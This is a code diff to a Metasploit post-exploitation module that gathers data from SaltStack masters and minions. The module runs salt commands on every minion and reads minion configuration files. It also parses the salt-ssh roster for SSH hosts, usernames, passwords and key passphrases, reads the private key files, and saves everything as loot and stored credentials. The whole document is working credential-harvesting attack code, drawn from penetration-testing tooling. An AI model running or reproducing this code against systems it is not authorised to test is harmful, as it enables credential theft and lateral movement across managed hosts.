@@ -12,21 +12,21 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'           => 'SaltStack Information Gatherer',
-        'Description'    => 'This module gathers information from SaltStack masters and minions',
-        'Author'         => [
+        'Name' => 'SaltStack Information Gatherer',
+        'Description' => 'This module gathers information from SaltStack masters and minions',
+        'Author' => [
           'h00die',
           'c2Vlcgo'
         ],
-        'SessionTypes'  => %w(shell meterpreter),
-        'License'        => MSF_LICENSE,
+        'SessionTypes' => %w[shell meterpreter],
+        'License' => MSF_LICENSE
       )
     )
     register_options(
       [
-        OptBool.new('GETHOSTNAME',[false, 'Gather Hostname from minions', true]),
-        OptBool.new('GETIP',[false, 'Gather IP from minions', true]),
-        OptBool.new('GETOS',[false, 'Gather OS from minions', true])
+        OptBool.new('GETHOSTNAME', [false, 'Gather Hostname from minions', true]),
+        OptBool.new('GETIP', [false, 'Gather IP from minions', true]),
+        OptBool.new('GETOS', [false, 'Gather OS from minions', true])
       ]
     )
   end
@@ -38,23 +38,26 @@ class MetasploitModule < Msf::Post
       command << 'network.get_hostname'
     end
     if datastore['GETIP']
-      #command << 'network.ip_addrs'
+      # command << 'network.ip_addrs'
       command << 'network.interfaces'
     end
     if datastore['GETOS']
       command << 'status.version'
     end
-    commas = ',' * (command.length-1) # we need to provide empty arguments for each command
+    commas = ',' * (command.length - 1) # we need to provide empty arguments for each command
     command = "salt '*' --output=yaml #{command.join(',')} '#{commas}'"
     begin
-      results = YAML.load(cmd_exec(command))
-      store_path = store_loot('saltstack_minion_data_gather', "application/x-yaml", session, results.to_yaml, "minion_data_gather.yaml", "SaltStack Minion Data Gather")
+      results = YAML.safe_load(cmd_exec(command))
+      store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Minion Data Gather')
       print_good("#{peer} - minion data gathering successfully retrieved and saved on #{store_path}")
     rescue Psych::SyntaxError
       print_error('Unable to process gather command output')
       return
     end
-    results.each do |key,result|
+    return if results == false
+    return if results.include?('Salt request timed out.')
+
+    results.each do |_key, result|
       host_info = {
         name: result['network.get_hostname'],
         os_flavor: result['status.version'],
@@ -62,6 +65,7 @@ class MetasploitModule < Msf::Post
       }
       result['network.interfaces'].each do |name, interface|
         next if name == 'lo'
+
         host_info[:mac] = interface['hwaddr']
         host_info[:host] = interface['inet'][0]['address'] # ignoring inet6
         report_host(host_info)
@@ -78,19 +82,19 @@ class MetasploitModule < Msf::Post
       return
     end
     begin
-      minions = YAML.load(cmd_exec('salt-key -L --output=yaml'))
+      minions = YAML.safe_load(cmd_exec('salt-key -L --output=yaml'))
     rescue Psych::SyntaxError
       print_error('Unable to load salt-key -L data')
       return
     end
 
     tbl = Rex::Text::Table.new(
-      'Header'  => 'Minions List',
-      'Indent'   => 1,
+      'Header' => 'Minions List',
+      'Indent' => 1,
       'Columns' => ['Status', 'Minion Name']
     )
 
-    store_path = store_loot('saltstack_minions', "application/x-yaml", session, minions.to_yaml, "minions.yaml", "SaltStack salt-key list")
+    store_path = store_loot('saltstack_minions', 'application/x-yaml', session, minions.to_yaml, 'minions.yaml', 'SaltStack salt-key list')
     print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
     minions['minions'].each do |minion|
       tbl << ['Accepted', minion]
@@ -110,14 +114,17 @@ class MetasploitModule < Msf::Post
   def minion
     print_status('Looking for salt minion config files')
     # https://github.com/saltstack/salt/blob/b427688048fdbee106f910c22ebeb105eb30aa10/doc/ref/configuration/minion.rst#configuring-the-salt-minion
-    [ '/usr/local/etc/salt/minion', # freebsd
-      '/etc/salt/minion']. each do |config|
+    [
+      '/usr/local/etc/salt/minion', # freebsd
+      '/etc/salt/minion'
+    ]. each do |config|
       next unless file?(config)
-      minion = YAML.load(read_file(config))
+
+      minion = YAML.safe_load(read_file(config))
       if minion['master']
         print_good("Minion master: #{minion['master']}")
       end
-      store_path = store_loot('saltstack_minion', "application/x-yaml", session, minion.to_yaml, "minion.yaml", "SaltStack Minion File")
+      store_path = store_loot('saltstack_minion', 'application/x-yaml', session, minion.to_yaml, 'minion.yaml', 'SaltStack Minion File')
       print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
     end
   end
@@ -137,45 +144,81 @@ class MetasploitModule < Msf::Post
     # get roster
     # https://github.com/saltstack/salt/blob/023528b3b1b108982989c4872c138d1796821752/doc/topics/ssh/roster.rst#salt-rosters
     print_status('Loading roster')
-    priv_to_retrieve = []
+    priv_values = {}
     ['/etc/salt/roster'].each do |config|
       next unless file?(config)
+
       begin
-        minions = YAML.load(read_file(config))
+        minions = YAML.safe_load(read_file(config))
       rescue Psych::SyntaxError
         print_error("Unable to load #{config}")
         next
       end
-      minions.each do |name,minion|
+      minions.each do |name, minion|
         host = minion['host'] # aka ip
         user = minion['user']
+        port = minion['port'] || 22
         passwd = minion['passwd']
-        sudo = minion['sudo'] || false
+        # sudo = minion['sudo'] || false
         priv = minion['priv'] || false
         priv_pass = minion['priv_passwd'] || false
-        unless priv == false
-          priv_to_retrieve.append(priv)
+
+        print_good("Found SSH minion: #{name} (#{host})")
+        # make a special print for encrypted ssh keys
+        unless priv_pass == false
+          print_good("  SSH key #{priv} password #{priv_pass}")
+          report_note(host: host,
+                      proto: 'TCP',
+                      port: port,
+                      type: 'SSH Key Password',
+                      data: "#{priv} => #{priv_pass}")
         end
-        priv_pass = minion['priv_passwd'] || false
+
         host_info = {
           name: name,
           comments: "SaltStack ssh minion to #{session.session_host}",
           host: host
         }
-        # XXX save to creds as well
         report_host(host_info)
-        print_good("Found SSH minion: #{host_info[:name]} (#{host_info[:host]})")
+
+        cred = {
+          address: host,
+          port: port,
+          protocol: 'tcp',
+          workspace_id: myworkspace_id,
+          origin_type: :service,
+          private_type: :password,
+          service_name: 'SSH',
+          module_fullname: fullname,
+          username: user,
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+        if passwd
+          cred[:private_data] = passwd
+          create_credential_and_login(cred)
+          next
+        end
+
+        # handle ssh keys if it wasn't a password
+        cred[:private_type] = :ssh_key
+        if priv_values[priv]
+          cred[:private_data] = priv_values[priv]
+          create_credential_and_login(cred)
+          next
+        end
+
+        unless file?(priv)
+          print_error("  Unable to find salt-ssh priv key #{priv}")
+          next
+        end
+        input = read_file(priv)
+        store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack SSH Private Key')
+        print_good("  #{priv} stored to #{store_path}")
+        priv_values[priv] = input
+        cred[:private_data] = input
+        create_credential_and_login(cred)
       end
-      store_path = store_loot('saltstack_roster', "application/x-yaml", session, minion.to_yaml, "roster.yaml", "SaltStack Roster File")
-      print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
-    end
-    priv_to_retrieve.each do |f|
-      unless file?(f)
-        print_error("Unable to find salt-ssh priv key #{f}")
-        next
-      end
-      input = read_file(f)
-      store_path = store_loot('ssh_key', "plain/txt", session, input, "salt-ssh.rsa", "SaltStack SSH Private Key")
+      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Roster File')
       print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
     end
   end
